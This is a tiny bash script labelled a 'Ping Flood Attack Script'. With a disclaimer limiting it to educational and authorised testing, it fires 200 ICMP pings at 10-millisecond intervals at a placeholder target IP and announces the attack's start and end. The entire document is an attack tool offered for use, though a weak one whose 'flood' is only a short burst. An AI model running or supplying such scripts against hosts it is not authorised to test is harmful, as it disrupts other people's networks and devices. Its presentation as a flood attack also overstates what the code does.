#!/bin/bash

# Ping Flood Attack Script (Linux)
# ⚠️ For educational and authorized testing only

TARGET_IP="IP"  # Change to your mobile's IP

echo "[*] Starting ping flood attack on $TARGET_IP..."

ping -i 0.01 -c 200 $TARGET_IP

echo "[+] Ping flood attack completed."
